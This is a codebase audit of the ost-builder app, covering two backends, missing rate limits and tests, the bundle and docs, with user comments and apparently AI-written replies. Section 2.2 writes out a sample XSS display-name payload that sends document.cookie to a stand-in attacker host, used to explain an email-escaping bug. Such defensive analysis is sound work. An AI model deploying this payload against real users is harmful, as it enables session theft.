# ost-builder — Codebase Audit (2026-05-22)

Scope: `packages/app`, `packages/cli`, `packages/shared`, `netlify/functions`, `packages/app/functions`. Audit framing: which structural issues will hurt as features are extended over time. Findings are ordered by blast radius, not severity in the abstract.

## TL;DR — the five things to fix first

1. **Delete the Cloudflare backend or own it.** `packages/app/functions/` is a complete second backend (21 files, ~2,100 LOC, D1 + KV + HMAC sessions + GitHub OAuth + rate limits + TTL + size caps) that hasn't been deployed since the Supabase migration. It's the more secure of the two implementations, but it's dead code. Anyone reading the repo can't tell which is live without git archaeology. Pick one and delete the other.
	1. we'll stick w supabase, but what are the things that we should take from this security and apply to our own?
		- **Decision:** delete `packages/app/functions/`, `wrangler.toml`, `schema.sql`. Port the following from it before deleting:
			- **Rate limiting** — port to a Supabase `rate_limits` table or `@upstash/ratelimit`. The CF code did per-IP read (300/min), per-user create (60/min), per-user update (120/min). Same envelope is fine.
			- **Payload size cap** — `MAX_MARKDOWN_BYTES = 256 * 1024` ported verbatim. Reject oversized markdown on POST and PATCH.
			- **Share TTL/expiry + soft-delete** — `expires_at`, `deleted_at`. Add a Supabase scheduled function for cleanup.
			- **Input validators** — `isVisibility`, `validateMarkdown`, `normalizeTtlDays`. Replace with zod schemas at every handler boundary.
			- **Explicit CORS** — copy `_http.ts` origin-echoing pattern. Needed once the CLI comes back.
		- **Skip** (Supabase covers these or they don't apply): HMAC session cookies, OAuth state cookies, CLI HMAC bearer tokens, KV-based rate counters, the `_auth.ts` JWT-alike. Supabase JWT + Postgres replace all of them.
2. **Restore the safety floor the Supabase functions dropped.** When the backend moved to Netlify+Supabase, rate limiting, payload size limits, share TTL/expiry, soft-delete, and IP-level read throttling were all silently dropped. The client still calls endpoints (`/api/share/store/:id/extend`, `/api/auth/logout`) that no longer exist. The client still sends `ttlDays` — the server ignores it; shares never expire.
	1. we should bring back the things that are adding meaningful security and stability; remmove the things that are unnecessary
		- **Bring back** (covered above in #1): rate limiting, size cap, TTL+expiry+soft-delete, input validators, CORS.
		- **Remove** (orphan client surface): delete `extendStoredShare` from `storedShareApi.ts` until the endpoint exists; delete `logout()` (Supabase has `supabase.auth.signOut()` client-side — that's the actual logout path). Drop the `ttlDays` field from `CreateStoredShareInput` until expiry ships.
		- **Sequence:** add the safety floor server-side first, then re-add the client features that use it. Otherwise the UI advertises capabilities the backend can't honor (current state).
3. **Stop relying on the service-role key as the only security layer.** Every Netlify function uses `SUPABASE_SERVICE_ROLE_KEY`, which bypasses RLS. Authorization is enforced entirely by `resolveRole()` in TypeScript — no defense in depth. One missed check on a future endpoint reads or writes arbitrary rows. Add Supabase RLS as a backstop.
	1. let's do it
		- **Decision recorded.** See §2.1 for the concrete RLS policies and the RBAC tie-in.
4. **Test the surface that actually carries risk.** All 14 E2E tests are canvas-pan regression guards; all 36 unit tests cover the markdown parser and URL encoding. **Zero** tests touch auth, share lifecycle, comments, permissions, the 628-line state store, the 798-line CLI, or any backend code. The most-tested code (markdown parser) is the lowest-risk; the least-tested (auth, sharing, persistence) is the highest.
	1. how do we set up a rule so that any time we develop a new feature or functionality we do appropriate testing with it?
		- **Rule, written into `CLAUDE.md`** (the file Claude reads every session — the right enforcement surface for an AI-driven codebase):
			- Every new Netlify function or new endpoint needs at least one auth test (anonymous denied / wrong-role denied / owner allowed) and one happy-path test.
			- Every new `ostStore` action needs a reducer test asserting the post-state.
			- Every new user-visible UI feature needs at least one E2E or component test of the happy path.
			- Before committing, the existing rule (`npm run build && npm run test:e2e`) holds, plus a new `npm test` (unit) must pass.
			- should it be a `/rule` instead?
					- **CLAUDE.md is the right place for the prompt-level rule** (Claude reads it every session), but it's only as strong as the model choosing to follow it. For real enforcement, add a **pre-commit hook (Husky)** that runs `npm test && npm run build && npm run test:e2e` and blocks failing commits, plus a **CI check** that does the same on PRs. CLAUDE.md tells Claude *why* to write tests; the hook and CI make it impossible to skip. A `/rule` skill doesn't exist yet — captured as Todoist task `6ghCvGvV64Rw6vjR` ("Build /rule skill — smart router for CLAUDE.md rules + settings.json hooks"). Design: takes plain-English rule → classifies as prompt-level (→ CLAUDE.md) vs enforcement (→ settings.json hook) vs both → asks which target location → delegates to existing `update-claude-md` / `update-config` skills. First real use case: landing the "every new feature needs tests" rule into ost-builder's CLAUDE.md (Phase C item #12). 
		- **PR template** (`.github/PULL_REQUEST_TEMPLATE.md`) with a "Tests added/updated for this change" checkbox that defaults to required.
		- **Coverage gate** in CI: wire `@vitest/coverage-v8` (already installed, unused), set baseline coverage and a ratchet — PRs may not drop coverage. Start permissive (≥40 % branch coverage on `packages/app/src/store` and `netlify/functions`) and tighten.
	2. we also should schedule regular test coverage audits and check tests for quality, that they aren't performative tests
		- **Cadence:** ~~quarterly~~ **weekly** test-quality audit. Read the test file alongside the production code it covers; flag tests that assert only "doesn't throw" or that mock the unit under test.
			- weekly this is a fast-moving project
				- **Agreed — weekly cadence noted.** Worth running this as a recurring scheduled Claude task (e.g., a Monday `/loop`): audit the previous week's new tests against the corresponding production code, output a list of tests that look performative plus a coverage delta. Five minutes if quiet, an hour if there's been a big push.
		- **Tooling for catching performative tests:** mutation testing (e.g., Stryker) on `packages/shared` and `netlify/functions`. If a test passes against mutated code, it's not actually testing the behaviour.
		- **Branch coverage** (not line coverage) as the metric — line coverage is easy to game with happy-path tests.
	3. and get these tests in place
		- See §3.5 for the ordered list. The four highest-leverage to write first: `resolveRole` truth table, share-create-read-update-delete lifecycle, `ostStore` reducers, email-escape regression test.
5. **Fix the HTML-injection vector in outgoing email.** `netlify/functions/share-store-comments.mts:73-80` interpolates `commenterName` and `shareName` into HTML email without escaping. A user with `<img src=x onerror=...>` as their Google display name posts a comment; the share owner receives an HTML email with attacker-controlled markup rendered by their mail client.
	1. that seems bad let's fix it
	2. but i want to add comment previews in the emails its very useful for people to know what the comment is and not make them click through
		- **Good news: the preview already works and isn't the part that's broken.** `body` is already HTML-escaped (`&`, `<`, `>` replaced) before being put in the `<blockquote>`. Owners already get the comment text inline.
		- **The fix is small and doesn't remove the preview.** Apply the same escape (`escapeHtml(name)`) to `commenterName` and `shareName` everywhere they appear — subject line, opening paragraph, blockquote-link label. Concretely: pull the inline `.replace(/&/g, '&amp;')...` chain into an `escapeHtml(s: string)` helper, apply to all three values, strip CR/LF from `subject` inputs as a defensive measure for header injection.
		- **Bonus while you're in there:** truncate `body` to ~500 chars in the email preview with an ellipsis + "view full comment" link, so very long comments don't blow up the email body. Keeps the preview useful, keeps the email skimmable.

The rest of this report supports those five and adds smaller findings.

---

## 1. Structural risks

### 1.1 Two backends live in the repo; only one is deployed

| | `packages/app/functions/` (Cloudflare Pages) | `netlify/functions/` (Netlify) |
|---|---|---|
| Files | 21 | 4 |
| LOC | ~2,100 | ~520 |
| Auth | Custom HMAC sessions + GitHub OAuth + CLI bearer tokens + refresh tokens | Supabase Auth (Google) |
| Storage | D1 (SQLite) + KV | Supabase Postgres |
| Rate limiting | Per-IP read + per-user create/update | None |
| Payload size limit | 256 KB markdown | None |
| TTL / expiry / soft-delete | Yes | No |
| CORS | Explicit, origin-echoing | Default |
| Comments | Not implemented | Implemented |
| Currently deployed | No | Yes (`netlify.toml` → `../../netlify/functions`) |

`wrangler.toml` still references KV (`59e571bf6ca04483aedcb1278fb5ed11`) and D1 (`087a7178-92de-4f1f-b9f9-7ab3cc35d8d1`) bindings, sitting beside the active Netlify config. `CLAUDE.md` and the project comments still describe "React + Vite + Cloudflare Pages."

**Concrete consequences observed today:**

- Client calls `extendStoredShare(id, ttlDays)` → `/api/share/store/:id/extend` → 404 (endpoint only exists in the CF code).
- Client calls `logout()` → `/api/auth/logout` → 404.
- Client `createStoredShare` sends `ttlDays` → server ignores it; shares are permanent.
- CLI `library *` subcommands send `Authorization: Bearer <HMAC token>` → the live backend only understands Supabase JWTs; every CLI library command will fail.
- `storedShareApi.ts` declares `provider: 'github'` everywhere; `auth-me.mts` returns `'google'`.
- `storedShareApi.ts` declares `ShareVisibility = 'public' | 'mozilla' | 'private'`; `_storedShare.ts` declares `'public' | 'private'`; the live backend treats `'mozilla'` as a valid third value.

**Recommendation:** delete `packages/app/functions/`, `wrangler.toml`, `schema.sql`, and the CLI auth/library subcommands; OR, if the CF backend will be revived, take the Netlify functions back to feature parity (rate limit, size cap, expiry) before adding anything new. Either way, do not keep both.

### 1.2 No Supabase schema in source control

The shape of `shares`, `share_members`, and `share_comments` is implied only by Netlify function code. `packages/app/functions/schema.sql` describes the old D1 schema, not the live Postgres schema. There are no Supabase migrations checked in. The database cannot be rebuilt from this repo, and schema changes are not reviewable in PRs.

**Recommendation:** add `supabase/migrations/` and capture the current schema as a baseline migration.

### 1.3 API contract is drifting between client and server

Beyond the endpoint mismatches in §1.1, the type definitions are out of sync across the three packages:

- `OAuthProvider` is `'github'` in shared types and `'github'` in CLI types, but the deployed backend returns `'google'`.
- `ShareVisibility` is two-valued in one place and three-valued in another.
- The Netlify functions accept `body.visibility ?? 'public'` with no `isVisibility` validator. Any string passes. `resolveRole` then string-matches against `'public'`, `'mozilla'` — anything else is treated as "private" by default.
- The Netlify `PATCH` handler accepts a free-form `Record<string, unknown>` body and copies any key starting with `markdown`, `name`, `settings`, `collapsedIds`, `visibility` into the update. Missing: type validation (you can store `markdown: 12345`, `settings: ['evil']`).

**Recommendation:** add `zod` validators on every Netlify handler boundary (zod is already a dependency).

### 1.4 The state store is at the size where it starts to hurt

`packages/app/src/store/ostStore.ts` is 628 lines, 30+ actions, one file, no slicing. Today this is fine. The next set of features (collaborative editing, undo/redo, presence, per-card permissions, comment threads) will not fit cleanly. Concrete extension hazards:

- **Every mutation re-serializes the entire markdown** (`addCard`, `updateCard`, `moveCard`, `copyCard`, `copyCardWithChildren`, `deleteCard` all call `serializeTreeToMarkdown(newTree, name)` on the full tree). Linear in tree size today; the 256 KB cap saves you. Without a cap, this becomes the bottleneck.
- **No history / undo.** Given markdown-as-truth, this would be trivial (a ring buffer of strings) but the store has no scaffold for it.
- **`canvasState` lives in the same store as card data.** CLAUDE.md already notes the perf gotcha ("avoid subscriptions to frequently-changing store slices inside card/tree components"). The right fix is to split canvas state into its own store.

the markdown as truth was designed so it would be easy for AI to edit, and I want to keep easy AI editing capabilities. But will the markdown concept serve us well from here on out?

> **Yes, with one design rule: markdown stays canonical for content; everything else lives in sidecar tables keyed by stable card ID.** The hazard isn't markdown itself — it's the temptation to push card metadata (comments, permissions, presence, history, reactions) into the markdown to keep one source of truth. Don't. Comments already live in `share_comments`. Per-card permissions, drafts, view state, history snapshots all belong in their own tables, joined by the `{#id}` stable IDs you already have (commit `42b1348`). As long as that line holds, the markdown stays clean enough for AI to edit and the relational tables hold the structured stuff. Real-time collaborative editing (Y.js / CRDTs) is the one future feature that would break the markdown-as-truth model — when that's on the roadmap, plan for a structured AST + a markdown render layer, not the other way around. Until then, the current design serves you well.

### 1.5 Background traffic from auto-save and cloud tracking

- `LibraryAutoSave` debounces local writes to 1 s, and if the snapshot has a `cloudShareId` it also calls `updateStoredShare` on every debounced tick. Active typing for an hour → ~3,600 cloud writes. No throttling, no batching, no offline queue.
- `ActiveCloudShareTracker`'s `useEffect` declares `markdown` and `projectName` as dependencies. The body fetches the cloud share and lists comments. Internal `lastReconciledRef` blocks the reconcile, but the network calls still fire on every keystroke — quietly DoSing your own Supabase project from a single active session.

**Recommendation:** drop `markdown` and `projectName` from the effect deps in `ActiveCloudShareTracker`. For `LibraryAutoSave`, raise the cloud-save debounce window (5–10 s) and add a max-frequency throttle.

### 1.6 Markdown-as-truth is the architectural strength

This is the load-bearing good decision in the codebase. `markdown` is canonical; `tree` is derived. CLI, share links, exports, the in-app editor — all of them speak the same string. As long as `parseMarkdownToTree` / `serializeTreeToMarkdown` stay strictly invertible, the model holds up well for what's coming. Keep this invariant under test (it isn't right now beyond simple shapes — round-tripping with edge-case markdown is not exercised).

okay that answers my question then

> **Confirmed.** Action: add round-trip property tests (`parse(serialize(parse(md))) === parse(md)`) on the markdown layer — currently the invariant is asserted by humans, not the test suite.

### 1.7 Other extensibility friction

- `packages/shared/src/**/*.js` is committed alongside the `.ts` sources — looks like accidentally-versioned build output. Should be `dist/` only.
- **Vestigial `share_comments.author` column** (surfaced by the Phase A baseline dump). The column exists in Postgres but no live code path writes to it — the Netlify functions only populate `author_name`. Either drop the column in a follow-up migration, or document it as the human-readable display name reserved for a future schema rework. Until decided, it's dead schema surface that invites bugs (a future endpoint could legitimately confuse `author` with `author_name`).
- ~40 shadcn `components/ui/` files are scaffolded; many (`carousel`, `input-otp`, `drawer`, `breadcrumb`, `navigation-menu`, `pagination`, `menubar`, `chart` with `recharts`) appear unreferenced. They contribute to the 683 KB main bundle.
	- are these things we should be using or dead weight?
		- **Dead weight.** shadcn's `npx shadcn add` scaffolds entire component families into your repo as source code — the unused ones are not lazy-loaded, they're just sitting in `src/components/ui/`. They only contribute to the bundle if something imports them. The fast way to find out which to delete: `grep -rL "from '@/components/ui/<name>'" packages/app/src` for each one. Net of that grep, delete the component file *and* its peer dep from `package.json` (e.g., delete `carousel.tsx` → drop `embla-carousel-react`).
		- **My confident guess from the structure: all the ones I listed are unused.** This codebase is a tree editor — it has no carousel, no calendar picker, no OTP input, no breadcrumb nav, no charts. Delete with confidence.
- The role model (`owner` / `editor` / `viewer`) is duplicated across `share-store-item.mts` and `share-store-comments.mts` with a `TODO: extract` comment. The duplication is fine at 2 sites; if comment moderators, per-card permissions, or share groups land, this turns into bugs.
	- let's get this fixed now so it doesn't give us troulbe later
		- **Concrete plan:** create `netlify/functions/_shareUtils.mts` with `getSupabase()`, `resolveRole()`, the `ShareRole` type, and a `requireRole(supabase, shareId, userId, minRole)` helper. Both function files import from it. Tiny PR (~30 lines moved), but it's the one that makes the RBAC redesign (§2.1) feasible — you can't change a policy that's pasted twice.
- Port confusion: `vite.config.ts` says 8787, Playwright preview hits 4173, README says 5173.
- `process-raw.sh` and the vault `raw/`/`wiki/` content sit inside this repo too — they're not part of the app but live next to it. Worth deciding whether ost-builder should be its own repo.
	- yeah it should be moved up a level
		- **Note: `ost-builder/` already has its own `.git/` directory** — it's a separate git repo nested inside the Mozilla vault, not a subfolder of the vault's git history. So this is a filesystem move, not a `git subtree split`. Steps:
			1. `mv ~/projects/work/mozilla/ost-builder ~/projects/ost-builder`
			2. Update `mozilla/CLAUDE.md` to remove ost-builder references (or add a "lives at `~/projects/ost-builder`" pointer)
			3. Update the Mozilla vault `.gitignore` if anything was pointing at the nested path
		- **Confirmed: Jenny's own project/fork, not Mozilla IP.** Move out of the vault, no entanglement.
		- **Follow-up worth thinking about:** the live Netlify deployment is Mozilla-flavored (`mozost.netlify.app`, the `mozilla` visibility value, "Sign in with your Mozilla Google account" copy in `StoredShareOpen.tsx`, the seeded Mozilla OST per commit `2728e34`). If the project is yours, decide whether the Mozilla skin is one *instance* of a multi-tenant product or whether it's baked in. The §2.1 RBAC redesign (multi-org table) is the natural place to make that generic.
			- make the list in todoist to clean this up
			- **Done.** Created parent task `Execute ost-builder codebase audit` (ID `6ghCqHw7Fx7pP2rR`) with Phase G — De-Mozilla as a subtask. Six de-Moz items underneath: rename visibility `'mozilla'` → `'company-limited'`; add `organizations` + `org_members` tables; update `resolveRole` to use `org_id`; generic auth copy; remove `mozost.netlify.app` fallback; replace seeded Mozilla OST.
			- **De-Mozilla decision recorded.** Mozilla becomes one *instance* of a multi-tenant product, not baked in. New visibility schema: `'public' | 'company-limited' | 'private'` (per Jenny's note in §2.1). The `'company-limited'` value is paired with an `org_id` on the share so any org can use it.

---

## 2. Security

### 2.1 No defense in depth — service role bypasses RLS

Every Netlify function uses `SUPABASE_SERVICE_ROLE_KEY`. This bypasses Row Level Security in Postgres. Authorization is enforced exclusively by `resolveRole()` in TypeScript — once in `share-store-item.mts`, once in `share-store-comments.mts` (a copy with a `TODO` to extract).

> **Update (Phase A, 2026-05-23): RLS policies already exist — and are broken.** The Phase A baseline dump (`supabase/migrations/0001_baseline.sql`) revealed 4 RLS policies on `shares` / `share_members` / `share_comments` that the audit missed. They're irrelevant in production today because the service-role key bypasses RLS, but they're not the "blank slate" the recommendation below assumed. Specifically:
> - `members read private shares` (on `shares`): compares `share_members.share_id = share_members.id` — a same-row tautology that never matches.
> - `members see membership` (on `share_members`): compares `sm2.share_id = sm2.share_id` — always true; equivalent to no filter.
> - `read public shares` (on `shares`): requires `auth.uid() IS NOT NULL` — would block anonymous reads of public shares if RLS weren't bypassed.
> - `create requires auth` (on `shares`, INSERT): correctly checks `auth.uid() = owner_id`.
> - `read comments on accessible shares` (on `share_comments`): the only fully correct policy.
>
> Phase B task 9 needs to **drop and rewrite** these, not "add." Treat the existing policies as untrusted artifacts — they don't reflect the intended RBAC and should be wiped before the new ones land.

Failure modes:
- A future endpoint adds a query, forgets to call `resolveRole` → arbitrary cross-tenant read/write.
- A bug in `resolveRole`'s string comparison (`share.visibility === 'public'`) → silent escalation.
- Any leak of the service key (env var, log, accidental commit) → full database access.

**Recommendation:** add RLS policies on `shares`, `share_members`, and `share_comments` based on `auth.uid()` and `share_members`. Keep the service key only for operations that genuinely need to bypass RLS (e.g., the system creating member rows on share creation). Run the front-of-house calls (read/update/list) as the user.

> agreed. is this something that ties in overall to our RBAC strategy?
>
> **Yes — and right now there isn't a written RBAC strategy, just an implicit one that lives in `resolveRole()`.** Worth making explicit before more features land. The current implicit model:
>
> | | public | mozilla | private |
> |---|---|---|---|
> | Anonymous | view | denied | denied |
> | Authenticated (non-member) | view | view (any Mozilla user) | denied |
> | `share_members.role = viewer` | view | view | view |
> | `share_members.role = editor` | view+edit | view+edit | view+edit |
> | `share_members.role = owner` | view+edit+visibility+delete | same | same |

public - company-limited -  private (not just moz, plan for future multi-tenancy)

> **Adopted as the new visibility schema.** Updated the de-Mozilla cleanup list in §1.7 to use `'public' | 'company-limited' | 'private'`. The `company-limited` value is paired with an `org_id` on the share so any org can use it, not just Mozilla. RLS policy for `company-limited` reads: "viewable by any member of the share's org" — clean and tenant-agnostic.

> **Recommendation: write this as `docs/rbac.md` and translate it directly into RLS policies.** Three things will stretch this model in the next ~6 months and they're worth designing for now (not implementing now):
>
> 1. **Capability-based, not role-based, under the hood.** Roles become bundles of capabilities (`can_read`, `can_edit_content`, `can_change_visibility`, `can_invite`, `can_delete`, `can_comment`, `can_moderate_comments`). RLS policies check capabilities, not role strings. This lets you add `commenter`, `moderator`, etc. without rewriting policies.
> 2. **Per-card permissions.** If product wants "this opportunity is only visible to the leadership team," role-on-share is too coarse. Plan a `card_permissions` sidecar table now even if you don't fill it yet.
> 	1. i am not expecting this anytime soon if ever but if it doesn't create [overhead, plan for it]
> 		- **Concrete impact if you plan for it now: ~zero.** All it means is the RBAC capability set includes a notional `can_read_card(card_id)` capability that today always returns true for anyone who can read the share. No new table, no new policy, no UI — just leaving the door open in the capability model. If per-card permissions never ship, you've added one unused capability constant. If they do ship, you don't have to redesign RLS. Worth doing. tech debt we can do it 
> 3. **Team/workspace tier above share.** "Mozilla users see Mozilla shares" is currently hardcoded as a string check on a visibility enum. If you add Acme, Globex, etc., that breaks. The right model: `organizations` table, `org_members`, share visibility includes "members of org X." Mozilla becomes one row, not a special-cased string.
> 		1.correct 
>
> Don't build all that now. Do write it down so the RLS policies you write this week don't have to be rewritten next quarter.

### 2.2 HTML injection in outgoing email

`netlify/functions/share-store-comments.mts:73-80`:

```ts
html: `
  <p><strong>${opts.commenterName}</strong> commented on your OST
  "<a href="${appUrl}/s/${opts.shareId}">${opts.shareName}</a>":</p>
  <blockquote ...>${escapedBody.replace(/\n/g, '<br>')}</blockquote>
  ...
`
```

`body` is escaped (`&`, `<`, `>`). `commenterName` and `shareName` are not.

- `commenterName` comes from Supabase `user.user_metadata.full_name` or `user.user_metadata.name`, which a user controls at sign-up time.
- `shareName` is the share owner's own input, so the owner can only attack themselves through it — low risk, but still wrong.

Attacker flow: sign up with Google, set display name to `<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">`. Comment on any visible share. Owner opens the email in a client that renders HTML (most do). Payload runs in mail-client context, which varies by client — webmail (Gmail) sanitizes aggressively; thick clients are less reliable.

The subject line `${opts.commenterName} commented on "${opts.shareName}"` is also a header-injection vector if Resend doesn't strip CR/LF (it does, but the code shouldn't rely on it).

**Recommendation:** HTML-escape `commenterName` and `shareName` the same way `body` is escaped. Strip newlines from `subject` inputs.

### 2.3 No rate limiting anywhere in the live backend

Compared to the Cloudflare implementation (which had per-user create at 60/min, per-user update at 120/min, per-IP read at 300/min), the Netlify functions have **no rate limits at all**:

- A single authenticated user can post unlimited comments per second, each one firing an email to the share owner via Resend (unmetered until your Resend quota is exhausted).
- A single authenticated user can create unlimited shares and patch them unbounded times per second.
- Anonymous users can read any public share at unlimited rate.

**Recommendation:** add Upstash Redis or a simple `kv` table for rate counters; gate writes per-user and reads per-IP. Cap email sends at ~5/min per share.
	see todoist mozilla project for an alternate proposlal, compare and reconcile 

### 2.4 No payload size limit

`share-store.mts` POST and `share-store-item.mts` PATCH insert `body.markdown` directly into the `shares.markdown` column with zero validation. CF version: `MAX_MARKDOWN_BYTES = 256 * 1024`. Postgres `text` can hold up to ~1 GB; nothing stops a user from creating multi-megabyte shares and exhausting your Supabase row-size limits or the React app's parser.

**Recommendation:** validate length on POST and PATCH. Reject `body.markdown.length > 256 * 1024`.

### 2.5 No CORS headers on Netlify functions

`auth-me.mts`, `share-store.mts`, `share-store-item.mts`, `share-store-comments.mts` set no CORS headers at all. The CF code in `_http.ts` explicitly echoed origin with `Access-Control-Allow-Origin`, `Vary: Origin`, and credentials. Today the app and API are same-origin so it works; the moment you serve the CLI or any cross-origin client, requests fail mysteriously.

### 2.6 No CSP

`netlify.toml` ships no security headers. App renders user-controlled markdown (titles, descriptions, link labels). React escapes by default; the markdown link parser (`renderMarkdownLinks`) only accepts `http(s)://` hrefs, which is good. But there's no defense in depth — any future regression (someone reaches for `dangerouslySetInnerHTML` to render full markdown, someone adds a `<iframe>`-friendly component) goes unchecked.

**Recommendation:** add a Netlify `headers` config with a basic CSP:

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
connect-src 'self' https://*.supabase.co;
frame-ancestors 'none';
```

Tighten over time.

### 2.7 npm audit — 12 findings (6 high, 5 moderate, 1 low)

```
postcss   moderate  direct   XSS via unescaped </style>
vite      high      direct   Arbitrary file read via dev-server WS (dev only)
lodash    high      transitive  Code injection via _.template / prototype pollution
minimatch high      transitive  ReDoS
picomatch high      transitive  ReDoS
rollup    high      transitive
flatted   high      transitive
ws        moderate  transitive  Uninitialized memory disclosure
yaml      moderate  transitive
ajv       moderate  transitive
brace-expansion moderate transitive
@tootallnate/once low transitive
```

All `fixAvailable: true`. The two direct ones (postcss, vite) ship in the build/dev toolchain, not in the production bundle, but should be bumped.

### 2.8 Smaller items

- `renderMarkdownLinks` uses `rel="noreferrer"` but not explicit `noopener`. Modern browsers imply noopener from noreferrer; explicit is safer.
- CLI session file (`~/.config/ost-builder/cli-session.json`) stores access + refresh tokens in plaintext. Standard, but worth knowing.
- `_auth.ts` HMAC comparison uses `===`, not constant-time. Practically OK at HMAC scale; if you keep this code, use `crypto.subtle.verify`.

---

## 3. Test quality

### 3.1 What's tested

- `packages/app/src/test/markdownOST.test.ts` — 928 lines, deeply exercises the markdown parser.
- `packages/app/src/test/urlEncoding.test.ts` — 321 lines, exhaustive on encode/decode, special chars, large payloads.
- `packages/app/src/test/localSnapshots.test.ts` — 71 lines, 3 cases covering the snapshot dedupe paths.
- `packages/app/e2e/canvas.spec.ts` — 7 Playwright tests × Chromium + Firefox = 14, all canvas-interaction regression guards.

### 3.2 What's not tested

- Auth — every Netlify function, every CF function: zero.
- Share lifecycle: create, read, update, delete, comments — zero.
- Role resolution (`resolveRole`) — zero. Branches on `public` / `mozilla` / `private` × `userId === owner` / `share_member` / anonymous — none exercised.
- Rate limiting and size caps (CF only) — zero.
- The state store (`ostStore.ts`, 628 LOC): card add/update/delete/move/copy, snapshot reload, comment counts — zero.
- The CLI (`packages/cli/src/index.ts`, 798 LOC) — zero. None of the legacy or library commands have tests.
- Persistence (`localSnapshots.ts`, 237 LOC) — only 3 tests on the upsert path; nothing on update, delete, active-key, hashing.
- The page components (Library, StoredShareOpen, Index) — zero.
- The auto-save and cloud-sync effects in `App.tsx` (`LibraryAutoSave`, `ActiveCloudShareTracker`) — zero. These are the components most likely to cause production traffic bugs.
- XSS escaping in the email pipeline — zero.

### 3.3 Calibration

The most-tested code is the lowest-risk surface (pure functions over strings). The least-tested code is the highest-risk surface (auth, network state, persistence). The E2E suite is named "guard tests" and is sized accordingly: it catches the specific class of bugs that has bitten before (pan-vs-click conflicts) and nothing else.

This is fine when the codebase is stable, but the user explicitly intends to extend features. Each new feature multiplies the unguarded surface.

### 3.4 Concrete gaps the test suite hides

The current suite would not have caught:
- The dropped `ttlDays` (shares never expire).
- The missing `/api/share/store/:id/extend` endpoint.
- The missing `/api/auth/logout` endpoint.
- The `'public' | 'private'` vs `'public' | 'mozilla' | 'private'` type drift.
- The `provider: 'github'` vs `'google'` mismatch.
- The email HTML injection.
- The `O(edits)` cloud-share refetch in `ActiveCloudShareTracker`.

### 3.5 Recommendations (in priority order)

1. **Add a vitest suite for the Netlify functions** using `supabase-js` mocks (or a local Supabase). Cover: anonymous read of public share, anonymous read of mozilla share (denied), anonymous read of private share (denied), member read, owner read, non-owner write attempt, comment delete by author vs. owner vs. third party.
2. **Add a vitest suite for `ostStore`**. Easy and high-value — pure reducers.
3. **Add an XSS regression test** for the email pipeline (assert the rendered HTML for a hostile `commenterName` is escaped).
4. **Wire `@vitest/coverage-v8`** (already installed, unused) into `package.json` and set a target.
5. **Expand E2E** to cover one full share-create / share-open / comment / sign-in flow against a local Netlify dev. Currently nothing exercises the most marketed feature.

---

## 4. Dependency / bundle observations

- Production main bundle: **683 KB** uncompressed, ~225 KB gzipped (`packages/app/dist/assets/index-CtK-vGVv.js`). Code-split chunks: Library (10.9 KB), StoredShareOpen (2.5 KB), supabaseClient (~80 B re-export). Most of the app ships in one chunk.
	- would love to break it up, it's already feeling slow
		- **First diagnose, then cut.** `rollup-plugin-visualizer` is already installed but not wired in. Add it to `vite.config.ts` and run `npm run build` once — it generates an interactive treemap showing exactly which packages are eating the bundle. Decisions get a lot easier after that.
		- **Likely biggest wins, in rough order:**
			1. Lazy-load `OSTBuilder` itself — currently in the main chunk, which means anyone opening `/s/:id` (share viewer) downloads the full editor. Move builder + its deps behind a route boundary so the share-view experience is light.
			2. Replace `framer-motion` (which is heavy) with CSS transitions for the one card-entry animation in `OSTCard.tsx`. Drops a sizable dep.
			3. Drop `@tanstack/react-query` from `package.json` — commit `c8c34de` already removed the code; the dep is stranded.
			4. Delete unused shadcn ui/* components + their Radix/embla/vaul peer deps (see §1.7).
			5. Switch `lucide-react` to named imports if you're not already — most of the bundle weight from `lucide-react` is unused icons unless tree-shaking is working. Confirm via visualizer.
		- **"Feels slow" check:** is the slowness on first paint (bundle size), on interaction (re-render cost — see §1.4, §1.5), or on save (network — see §1.5)? Cure depends on diagnosis. Profile in DevTools Performance tab before optimising. The `ActiveCloudShareTracker` issue (network request per keystroke) is a more likely cause of perceived slowness than bundle size for an active session.
- shadcn/ui scaffolding pulled in many Radix components that don't appear to be referenced from app code: `carousel` (+`embla-carousel-react`), `input-otp` (+`input-otp`), `drawer` (+`vaul`), `navigation-menu`, `menubar`, `breadcrumb`, `pagination`, `chart` (+`recharts`), `calendar` (+`react-day-picker`). Dropping the unused ones plus their deps should shave a meaningful chunk.
- `@tanstack/react-query` is listed in `dependencies` but commit `c8c34de perf: remove unused react-query` says it was supposed to be removed. Still in `package.json`.
- `framer-motion` is heavy and used for one card-entry animation in `OSTCard.tsx`. Consider replacing with CSS transitions.
- `html-to-image` (used by export PNG) is correctly lazy-loaded per the commit log.

---

## 5. Docs / operational hygiene

- `CLAUDE.md` is wrong about the stack ("Cloudflare Pages"). Update to Netlify + Supabase.
- No `DEPLOYMENT.md`, no schema migrations, no service-role-key rotation playbook, no env-var matrix. Someone joining this project cannot reproduce the deploy.
	- lets get those fixed
		- **`docs/DEPLOYMENT.md`** with: Netlify project setup, Supabase project setup (including OAuth redirect URI configuration in Google Cloud Console), env-var matrix (which vars go in Netlify dashboard vs. `.env.local` for Vite vs. CI), schema baseline migration, service-role-key rotation steps, on-call/triage pointers.
		- **`supabase/migrations/`** committed. Baseline migration is whatever `\d shares; \d share_members; \d share_comments;` produces today. Going forward, every schema change is a migration in this folder and reviewed in PR.
		- **`docs/runbook.md`** with: Resend quota exhaustion, Supabase rate-limit hit, share-load 500, OAuth-redirect-uri-mismatch. Short — bullet points per scenario.
- `.env.example` mixes CF-era variables (`SUPABASE_SERVICE_ROLE_KEY`, used by functions) and Vite-era (`VITE_SUPABASE_*`). Document which envs go where (Netlify dashboard vs. Vite build).
- `README.md` advertises CLI commands (`auth login`, `library *`) that don't work against the live backend.
	- i would love to get those back again and documented so agents can work with the product
		- **Strong yes — and this is more strategic than it sounds.** A CLI that AI agents can drive is the AI-first product surface for ost-builder. The current CLI was built for the CF backend; against Supabase it needs an auth flow that works without a browser dance.
		- **Recommended auth model for the CLI: personal access tokens (PATs).** User goes to a `/settings/tokens` page in the app, clicks "Generate token," gets a one-time-displayed `osb_xxx` string, pastes into `ost-builder auth login <token>`. Token is stored in `~/.config/ost-builder/cli-session.json` (already supported by the existing CLI). Backend stores a hash of the token in a `cli_tokens` table with user_id, label, last_used_at, expires_at. Every API call validates the token, looks up the user, then runs Supabase as that user. Agents (Claude, Cursor, GitHub Copilot, etc.) get a stable bearer they can use forever — no OAuth dance.
		- **Why not Supabase JWTs directly:** they're short-lived (1 hr) and require refresh tokens, which is a poor fit for ambient agent use.
